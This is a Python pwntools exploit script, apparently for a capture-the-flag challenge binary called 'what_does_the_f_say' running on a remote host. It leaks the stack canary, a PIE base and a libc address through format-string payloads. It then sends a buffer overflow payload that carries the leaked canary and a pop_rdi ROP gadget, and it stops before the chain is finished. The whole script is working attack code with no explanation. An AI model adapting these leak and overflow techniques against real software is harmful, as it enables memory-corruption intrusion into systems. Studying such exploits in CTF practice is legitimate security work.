from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./what_does_the_f_say")
libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./what_does_the_f_say")
p = remote("161.35.169.118", 30254)
#p = gdb.debug("./what_does_the_f_say", '''break *main
#break *warning+252
#''')

# Memory Leak: Canary Address
payload = "%13$llx"

# Memory Leak: __libc_csu_init address for PIE Bypess
payload2 = "%24$llx"

# Memory Leak: __libc_leak
payload3 = "%3$llx"

# Canary Leak Setup
time.sleep(1)
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()


# Stack Canary Leak
time.sleep(1)
p.clean()
p.sendline(payload)
canary_leak = int(p.recvline(), 16)

print "Canary leak:", hex(canary_leak)

# PIE Bypass - __libc_csu_init leak
time.sleep(1)
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()


# __libc_csu_init leak
time.sleep(1)
p.clean()
p.sendline(payload2)
libc_csu_init_leak = int(p.recvline(), 16)
pie_base = libc_csu_init_leak - 6240

print "libc_csu_init() leak:", hex(libc_csu_init_leak)
print "PIE Base Address:", hex(pie_base)

time.sleep(1)
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()


# libc leak Canary Leak
time.sleep(1)
p.clean()
p.sendline(payload3)
libc_leak = int(p.recvline(), 16)
p.recvline()
p.clean()

print "libc_leak:", hex(libc_leak)

# Spend $ to trigger warning()
for i in range(7):
    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    time.sleep(1) # Debugging purposes, race condition errors


# Stack Canary & Overflow Setup
time.sleep(1)
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()
p.sendline("Red")
p.recvline()


pop_rdi = pie_base + 0x18bb
ret = pie_base + 0x1016

print "pop_rdi:", hex(pop_rdi)

# Stack Canary Bypass + RSP Overflow
time.sleep(1)
payload4 = ""
payload4 += "A" * 24
payload4 += p64(canary_leak) 
payload4 += "C" * 8

payload4 += p64(pop_rdi)

p.sendline(payload4)
p.interactive()
